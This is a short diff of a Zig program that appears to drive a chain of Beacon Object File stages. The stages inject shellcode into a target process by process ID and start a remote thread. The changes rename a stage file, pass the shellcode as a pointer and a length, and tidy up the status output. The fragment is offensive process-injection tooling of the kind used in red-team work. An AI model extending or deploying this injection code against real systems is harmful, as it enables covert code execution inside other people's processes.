@@ -41,7 +41,7 @@ pub fn main() !void {
     defer bof_stage0.release();
 
     const bof_stage1 = blk: {
-        const coff = try loadBofFromFile(allocator, "wInjectionChainStage1");
+        const coff = try loadBofFromFile(allocator, "wInjectionChainStage1A");
         defer allocator.free(coff);
         break :blk try bof.Object.initFromMemory(coff);
     };
@@ -65,7 +65,8 @@ pub fn main() !void {
     defer allocator.destroy(state);
     state.* = .{
         .process_id = pid,
-        .shellcode = shellcode,
+        .shellcode = shellcode.ptr,
+        .shellcode_len = shellcode.len,
     };
 
     const args = try bof.Args.init();
@@ -132,9 +133,7 @@ pub fn main() !void {
         0,
         null,
     );
-    std.debug.print("nt status: {d}\n", .{state.nt_status});
-
-    state.nt_status = w32.NtClose(thread_handle);
+    _ = w32.NtClose(thread_handle);
 
     std.debug.print("nt status: {d}\n", .{state.nt_status});
 }
